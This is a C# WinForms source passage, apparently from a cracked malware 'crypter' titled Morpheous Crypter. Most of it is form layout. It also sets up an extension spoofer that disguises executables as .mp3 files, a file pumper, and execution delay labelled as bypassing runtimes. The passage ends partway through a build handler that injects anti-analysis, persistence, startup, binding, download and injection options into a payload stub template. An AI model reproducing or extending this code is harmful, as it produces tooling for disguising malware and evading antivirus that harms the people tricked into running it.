            this.instaSeperator6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator6.IsVertical = false;
            this.instaSeperator6.Location = new System.Drawing.Point(6, 3);
            this.instaSeperator6.Name = "instaSeperator6";
            this.instaSeperator6.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator6.TabIndex = 30;
            this.instaSeperator6.Text = "instaSeperator6";
            this.instaSeperator6.Thickness = 1F;
            // 
            // tabPage4
            // 
            this.tabPage4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(212)))), ((int)(((byte)(212)))), ((int)(((byte)(212)))));
            this.tabPage4.Controls.Add(this.instaLabel30);
            this.tabPage4.Controls.Add(this.aVersion);
            this.tabPage4.Controls.Add(this.instaLabel29);
            this.tabPage4.Controls.Add(this.instaLabel28);
            this.tabPage4.Controls.Add(this.aDescription);
            this.tabPage4.Controls.Add(this.instaLabel27);
            this.tabPage4.Controls.Add(this.instaLabel26);
            this.tabPage4.Controls.Add(this.aTitle);
            this.tabPage4.Controls.Add(this.instaLabel25);
            this.tabPage4.Controls.Add(this.instaButton13);
            this.tabPage4.Controls.Add(this.instaButton12);
            this.tabPage4.Controls.Add(this.aCopyright);
            this.tabPage4.Controls.Add(this.aProduct);
            this.tabPage4.Controls.Add(this.aCompany);
            this.tabPage4.Controls.Add(this.instaLabel24);
            this.tabPage4.Controls.Add(this.instaSeperator11);
            this.tabPage4.Controls.Add(this.instaButton11);
            this.tabPage4.Controls.Add(this.instaButton10);
            this.tabPage4.Controls.Add(this.instaButton9);
            this.tabPage4.Controls.Add(this.pictureBox1);
            this.tabPage4.Controls.Add(this.instaLabel15);
            this.tabPage4.Controls.Add(this.instaSeperator10);
            this.tabPage4.Location = new System.Drawing.Point(156, 4);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Size = new System.Drawing.Size(284, 215);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Assembly";
            // 
            // instaLabel30
            // 
            this.instaLabel30.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel30.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel30.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel30.Location = new System.Drawing.Point(13, 128);
            this.instaLabel30.Name = "instaLabel30";
            this.instaLabel30.Size = new System.Drawing.Size(61, 19);
            this.instaLabel30.TabIndex = 53;
            this.instaLabel30.Text = "Version";
            // 
            // aVersion
            // 
            this.aVersion.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.aVersion.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.aVersion.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.aVersion.Location = new System.Drawing.Point(80, 125);
            this.aVersion.Name = "aVersion";
            this.aVersion.Size = new System.Drawing.Size(145, 19);
            this.aVersion.TabIndex = 52;
            this.aVersion.Text = "1.0.0.0";
            // 
            // instaLabel29
            // 
            this.instaLabel29.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel29.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel29.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel29.Location = new System.Drawing.Point(13, 107);
            this.instaLabel29.Name = "instaLabel29";
            this.instaLabel29.Size = new System.Drawing.Size(61, 19);
            this.instaLabel29.TabIndex = 51;
            this.instaLabel29.Text = "Copyright";
            // 
            // instaLabel28
            // 
            this.instaLabel28.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel28.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel28.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel28.Location = new System.Drawing.Point(13, 87);
            this.instaLabel28.Name = "instaLabel28";
            this.instaLabel28.Size = new System.Drawing.Size(61, 19);
            this.instaLabel28.TabIndex = 50;
            this.instaLabel28.Text = "Product";
            // 
            // aDescription
            // 
            this.aDescription.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.aDescription.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.aDescription.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.aDescription.Location = new System.Drawing.Point(80, 45);
            this.aDescription.Name = "aDescription";
            this.aDescription.Size = new System.Drawing.Size(145, 19);
            this.aDescription.TabIndex = 41;
            // 
            // instaLabel27
            // 
            this.instaLabel27.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel27.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel27.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel27.Location = new System.Drawing.Point(13, 66);
            this.instaLabel27.Name = "instaLabel27";
            this.instaLabel27.Size = new System.Drawing.Size(61, 19);
            this.instaLabel27.TabIndex = 49;
            this.instaLabel27.Text = "Company";
            // 
            // instaLabel26
            // 
            this.instaLabel26.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel26.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel26.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel26.Location = new System.Drawing.Point(13, 48);
            this.instaLabel26.Name = "instaLabel26";
            this.instaLabel26.Size = new System.Drawing.Size(61, 19);
            this.instaLabel26.TabIndex = 48;
            this.instaLabel26.Text = "Description";
            // 
            // aTitle
            // 
            this.aTitle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.aTitle.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.aTitle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.aTitle.Location = new System.Drawing.Point(80, 25);
            this.aTitle.Name = "aTitle";
            this.aTitle.Size = new System.Drawing.Size(145, 19);
            this.aTitle.TabIndex = 40;
            // 
            // instaLabel25
            // 
            this.instaLabel25.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel25.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel25.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel25.Location = new System.Drawing.Point(13, 28);
            this.instaLabel25.Name = "instaLabel25";
            this.instaLabel25.Size = new System.Drawing.Size(61, 19);
            this.instaLabel25.TabIndex = 47;
            this.instaLabel25.Text = "Title";
            // 
            // instaButton13
            // 
            this.instaButton13.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton13.Location = new System.Drawing.Point(235, 85);
            this.instaButton13.Name = "instaButton13";
            this.instaButton13.Size = new System.Drawing.Size(36, 39);
            this.instaButton13.TabIndex = 46;
            this.instaButton13.Text = "Clear";
            this.instaButton13.Click += new System.EventHandler(this.instaButton13_Click);
            // 
            // instaButton12
            // 
            this.instaButton12.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton12.Location = new System.Drawing.Point(235, 45);
            this.instaButton12.Name = "instaButton12";
            this.instaButton12.Size = new System.Drawing.Size(36, 39);
            this.instaButton12.TabIndex = 45;
            this.instaButton12.Text = "Clone";
            this.instaButton12.Click += new System.EventHandler(this.instaButton12_Click);
            // 
            // aCopyright
            // 
            this.aCopyright.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.aCopyright.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.aCopyright.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.aCopyright.Location = new System.Drawing.Point(80, 105);
            this.aCopyright.Name = "aCopyright";
            this.aCopyright.Size = new System.Drawing.Size(145, 19);
            this.aCopyright.TabIndex = 44;
            // 
            // aProduct
            // 
            this.aProduct.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.aProduct.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.aProduct.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.aProduct.Location = new System.Drawing.Point(80, 85);
            this.aProduct.Name = "aProduct";
            this.aProduct.Size = new System.Drawing.Size(145, 19);
            this.aProduct.TabIndex = 43;
            // 
            // aCompany
            // 
            this.aCompany.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.aCompany.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.aCompany.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.aCompany.Location = new System.Drawing.Point(80, 65);
            this.aCompany.Name = "aCompany";
            this.aCompany.Size = new System.Drawing.Size(145, 19);
            this.aCompany.TabIndex = 42;
            // 
            // instaLabel24
            // 
            this.instaLabel24.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel24.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel24.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel24.Location = new System.Drawing.Point(7, 7);
            this.instaLabel24.Name = "instaLabel24";
            this.instaLabel24.Size = new System.Drawing.Size(134, 19);
            this.instaLabel24.TabIndex = 39;
            this.instaLabel24.Text = "Assembly Info";
            // 
            // instaSeperator11
            // 
            this.instaSeperator11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator11.IsVertical = false;
            this.instaSeperator11.Location = new System.Drawing.Point(6, 3);
            this.instaSeperator11.Name = "instaSeperator11";
            this.instaSeperator11.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator11.TabIndex = 38;
            this.instaSeperator11.Text = "instaSeperator11";
            this.instaSeperator11.Thickness = 1F;
            // 
            // instaButton11
            // 
            this.instaButton11.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton11.Location = new System.Drawing.Point(210, 174);
            this.instaButton11.Name = "instaButton11";
            this.instaButton11.Size = new System.Drawing.Size(61, 25);
            this.instaButton11.TabIndex = 37;
            this.instaButton11.Text = "Clear";
            this.instaButton11.Click += new System.EventHandler(this.instaButton11_Click);
            // 
            // instaButton10
            // 
            this.instaButton10.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton10.Location = new System.Drawing.Point(74, 174);
            this.instaButton10.Name = "instaButton10";
            this.instaButton10.Size = new System.Drawing.Size(61, 25);
            this.instaButton10.TabIndex = 36;
            this.instaButton10.Text = "Browse";
            this.instaButton10.Click += new System.EventHandler(this.instaButton10_Click);
            // 
            // instaButton9
            // 
            this.instaButton9.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton9.Location = new System.Drawing.Point(142, 174);
            this.instaButton9.Name = "instaButton9";
            this.instaButton9.Size = new System.Drawing.Size(61, 25);
            this.instaButton9.TabIndex = 35;
            this.instaButton9.Text = "Clone";
            this.instaButton9.Click += new System.EventHandler(this.instaButton9_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Location = new System.Drawing.Point(16, 169);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(32, 32);
            this.pictureBox1.TabIndex = 34;
            this.pictureBox1.TabStop = false;
            // 
            // instaLabel15
            // 
            this.instaLabel15.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel15.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel15.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel15.Location = new System.Drawing.Point(7, 151);
            this.instaLabel15.Name = "instaLabel15";
            this.instaLabel15.Size = new System.Drawing.Size(134, 19);
            this.instaLabel15.TabIndex = 33;
            this.instaLabel15.Text = "Icon";
            // 
            // instaSeperator10
            // 
            this.instaSeperator10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator10.IsVertical = false;
            this.instaSeperator10.Location = new System.Drawing.Point(6, 147);
            this.instaSeperator10.Name = "instaSeperator10";
            this.instaSeperator10.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator10.TabIndex = 32;
            this.instaSeperator10.Text = "instaSeperator10";
            this.instaSeperator10.Thickness = 1F;
            // 
            // tabPage6
            // 
            this.tabPage6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(212)))), ((int)(((byte)(212)))), ((int)(((byte)(212)))));
            this.tabPage6.Controls.Add(this.instaLabel22);
            this.tabPage6.Controls.Add(this.instaLabel21);
            this.tabPage6.Controls.Add(this.instaLabel20);
            this.tabPage6.Controls.Add(this.numDelay);
            this.tabPage6.Controls.Add(this.instaLabel19);
            this.tabPage6.Controls.Add(this.instaSeperator9);
            this.tabPage6.Controls.Add(this.instaLabel18);
            this.tabPage6.Controls.Add(this.numPump);
            this.tabPage6.Controls.Add(this.instaLabel17);
            this.tabPage6.Controls.Add(this.instaLabel16);
            this.tabPage6.Controls.Add(this.instaSeperator8);
            this.tabPage6.Controls.Add(this.labelExtension);
            this.tabPage6.Controls.Add(this.txtExtension);
            this.tabPage6.Controls.Add(this.instaLabel14);
            this.tabPage6.Controls.Add(this.boxSpoof);
            this.tabPage6.Controls.Add(this.instaSeperator7);
            this.tabPage6.Location = new System.Drawing.Point(156, 4);
            this.tabPage6.Name = "tabPage6";
            this.tabPage6.Size = new System.Drawing.Size(284, 215);
            this.tabPage6.TabIndex = 5;
            this.tabPage6.Text = "Extras";
            // 
            // instaLabel22
            // 
            this.instaLabel22.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel22.Font = new System.Drawing.Font("Verdana", 6F);
            this.instaLabel22.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel22.Location = new System.Drawing.Point(54, 197);
            this.instaLabel22.Name = "instaLabel22";
            this.instaLabel22.Size = new System.Drawing.Size(181, 10);
            this.instaLabel22.TabIndex = 47;
            this.instaLabel22.Text = "Delaying Execution helps bypass Runtimes";
            // 
            // instaLabel21
            // 
            this.instaLabel21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel21.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel21.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel21.Location = new System.Drawing.Point(188, 165);
            this.instaLabel21.Name = "instaLabel21";
            this.instaLabel21.Size = new System.Drawing.Size(47, 19);
            this.instaLabel21.TabIndex = 46;
            this.instaLabel21.Text = "seconds";
            // 
            // instaLabel20
            // 
            this.instaLabel20.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel20.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel20.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel20.Location = new System.Drawing.Point(40, 165);
            this.instaLabel20.Name = "instaLabel20";
            this.instaLabel20.Size = new System.Drawing.Size(47, 19);
            this.instaLabel20.TabIndex = 45;
            this.instaLabel20.Text = "Wait";
            // 
            // numDelay
            // 
            this.numDelay.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.numDelay.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.numDelay.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.numDelay.Location = new System.Drawing.Point(98, 162);
            this.numDelay.Name = "numDelay";
            this.numDelay.Size = new System.Drawing.Size(80, 19);
            this.numDelay.TabIndex = 44;
            // 
            // instaLabel19
            // 
            this.instaLabel19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel19.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel19.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel19.Location = new System.Drawing.Point(26, 137);
            this.instaLabel19.Name = "instaLabel19";
            this.instaLabel19.Size = new System.Drawing.Size(134, 19);
            this.instaLabel19.TabIndex = 43;
            this.instaLabel19.Text = "Delay Execution";
            // 
            // instaSeperator9
            // 
            this.instaSeperator9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator9.IsVertical = false;
            this.instaSeperator9.Location = new System.Drawing.Point(6, 133);
            this.instaSeperator9.Name = "instaSeperator9";
            this.instaSeperator9.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator9.TabIndex = 42;
            this.instaSeperator9.Text = "instaSeperator9";
            this.instaSeperator9.Thickness = 1F;
            // 
            // instaLabel18
            // 
            this.instaLabel18.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel18.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel18.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel18.Location = new System.Drawing.Point(206, 105);
            this.instaLabel18.Name = "instaLabel18";
            this.instaLabel18.Size = new System.Drawing.Size(47, 19);
            this.instaLabel18.TabIndex = 41;
            this.instaLabel18.Text = "kb";
            // 
            // numPump
            // 
            this.numPump.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.numPump.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.numPump.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.numPump.Location = new System.Drawing.Point(80, 103);
            this.numPump.Name = "numPump";
            this.numPump.Size = new System.Drawing.Size(120, 19);
            this.numPump.TabIndex = 39;
            // 
            // instaLabel17
            // 
            this.instaLabel17.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel17.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel17.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel17.Location = new System.Drawing.Point(40, 105);
            this.instaLabel17.Name = "instaLabel17";
            this.instaLabel17.Size = new System.Drawing.Size(47, 19);
            this.instaLabel17.TabIndex = 40;
            this.instaLabel17.Text = "Pump";
            // 
            // instaLabel16
            // 
            this.instaLabel16.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel16.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel16.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel16.Location = new System.Drawing.Point(26, 78);
            this.instaLabel16.Name = "instaLabel16";
            this.instaLabel16.Size = new System.Drawing.Size(134, 19);
            this.instaLabel16.TabIndex = 38;
            this.instaLabel16.Text = "File Pumper";
            // 
            // instaSeperator8
            // 
            this.instaSeperator8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator8.IsVertical = false;
            this.instaSeperator8.Location = new System.Drawing.Point(6, 74);
            this.instaSeperator8.Name = "instaSeperator8";
            this.instaSeperator8.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator8.TabIndex = 37;
            this.instaSeperator8.Text = "instaSeperator8";
            this.instaSeperator8.Thickness = 1F;
            // 
            // labelExtension
            // 
            this.labelExtension.AccessibleDescription = "";
            this.labelExtension.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.labelExtension.Font = new System.Drawing.Font("Verdana", 7F);
            this.labelExtension.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.labelExtension.Location = new System.Drawing.Point(155, 34);
            this.labelExtension.Name = "labelExtension";
            this.labelExtension.Size = new System.Drawing.Size(102, 19);
            this.labelExtension.TabIndex = 36;
            this.labelExtension.Text = "example.exe";
            // 
            // txtExtension
            // 
            this.txtExtension.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.txtExtension.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtExtension.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.txtExtension.Location = new System.Drawing.Point(26, 33);
            this.txtExtension.Name = "txtExtension";
            this.txtExtension.Size = new System.Drawing.Size(106, 19);
            this.txtExtension.TabIndex = 35;
            this.txtExtension.Text = ".mp3";
            this.txtExtension.TextChanged += new System.EventHandler(this.txtExtension_TextChanged);
            // 
            // instaLabel14
            // 
            this.instaLabel14.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel14.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel14.Location = new System.Drawing.Point(26, 7);
            this.instaLabel14.Name = "instaLabel14";
            this.instaLabel14.Size = new System.Drawing.Size(134, 19);
            this.instaLabel14.TabIndex = 33;
            this.instaLabel14.Text = "Extension Spoofer";
            // 
            // boxSpoof
            // 
            this.boxSpoof.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.boxSpoof.Checked = false;
            this.boxSpoof.CheckStyle = InstaCheckBox.CheckStyleType.Checkmark;
            this.boxSpoof.Font = new System.Drawing.Font("Verdana", 7F);
            this.boxSpoof.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.boxSpoof.Location = new System.Drawing.Point(9, 7);
            this.boxSpoof.Name = "boxSpoof";
            this.boxSpoof.Size = new System.Drawing.Size(78, 21);
            this.boxSpoof.TabIndex = 34;
            // 
            // instaSeperator7
            // 
            this.instaSeperator7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator7.IsVertical = false;
            this.instaSeperator7.Location = new System.Drawing.Point(6, 3);
            this.instaSeperator7.Name = "instaSeperator7";
            this.instaSeperator7.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator7.TabIndex = 32;
            this.instaSeperator7.Text = "instaSeperator7";
            this.instaSeperator7.Thickness = 1F;
            // 
            // instaTheme1
            // 
            this.instaTheme1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(12)))), ((int)(((byte)(12)))), ((int)(((byte)(12)))));
            this.instaTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.instaTheme1.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaTheme1.ForeColor = System.Drawing.Color.LightBlue;
            this.instaTheme1.Location = new System.Drawing.Point(0, 0);
            this.instaTheme1.Name = "instaTheme1";
            this.instaTheme1.ShowIcon = false;
            this.instaTheme1.Size = new System.Drawing.Size(461, 394);
            this.instaTheme1.TabIndex = 0;
            this.instaTheme1.Text = "Morpheous Crypter Cracked By Reborn ";
            // 
            // Form1
            // 
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(49)))), ((int)(((byte)(49)))));
            this.ClientSize = new System.Drawing.Size(461, 394);
            this.Controls.Add(this.instaButton8);
            this.Controls.Add(this.textBox4);
            this.Controls.Add(this.expDate);
            this.Controls.Add(this.instaButton3);
            this.Controls.Add(this.instaSeperator2);
            this.Controls.Add(this.cryptingBar);
            this.Controls.Add(this.instaButton1);
            this.Controls.Add(this.timeRem);
            this.Controls.Add(this.username);
            this.Controls.Add(this.instaTabControl1);
            this.Controls.Add(this.instaTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.Text = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load_1);
            this.instaTabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage1.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage3.ResumeLayout(false);
            this.tabPage3.PerformLayout();
            this.tabPage5.ResumeLayout(false);
            this.tabPage7.ResumeLayout(false);
            this.tabPage7.PerformLayout();
            this.tabPage4.ResumeLayout(false);
            this.tabPage4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.tabPage6.ResumeLayout(false);
            this.tabPage6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numDelay)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.numPump)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private void instaButton1_Click(object sender, EventArgs e)
        {
          
            if (!string.IsNullOrEmpty(FileLoc))
            {
                this.cryptingBar.Value = 0f;
                this.cryptingBar.Refresh();
                SaveFileDialog dialog = new SaveFileDialog {
                    Filter = ".exe|*.exe",
                    ShowHelp = true
                };
                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        if (this.custom.Checked)
                        {
                            inj = this.txtInj.Text;
                        }
                        string str = EladitosCrypter.Properties.Resources.Source1;
                        bool flag = false;
                        bool flag2 = false;
                        bool flag3 = false;
                        bool flag4 = this.boolMsg.Checked;
                        string newValue = RndString(r.Next(11, 20));
                        string str3 = RndString(r.Next(11, 20));
                        string str4 = RndString(70);
                        if (this.listBind.Items.Count > 0)
                        {
                            flag = true;
                        }
                        if (this.listDL.Items.Count > 0)
                        {
                            flag2 = true;
                        }
                        this.increase(5f);
                        if (((this.a1.Checked || this.a2.Checked) || (this.a3.Checked || this.a4.Checked)) || this.a5.Checked)
                        {
                            flag3 = true;
                        }
                        str = str.Replace("[ANTI]", flag3.ToString().ToLower()).Replace("[SLEEP]", this.numDelay.Value.ToString() + "000").Replace("[ENCRYPTION]", str4).Replace("[STARTUP]", this.boxStartup.Checked.ToString().ToLower());
                        this.increase(10f);
                        str = str.Replace("[BIND]", flag.ToString().ToLower()).Replace("[DOWNLOAD]", flag2.ToString().ToLower()).Replace("[MESSAGE]", flag4.ToString().ToLower()).Replace("[RESOURCEFILE]", newValue).Replace("[RESNAME]", str3).Replace("[PERSISTENCE]", this.boxPersistence.Checked.ToString().ToLower()).Replace("[INJECT]", inj);
                        this.increase(10f);
                        if (this.boxStartup.Checked)
                        {
                            str = str.Replace("[SFILE]", this.txtSUPfile.Text).Replace("[SNAME]", this.txtSUPvalue.Text);
                        }
                        else
                        {
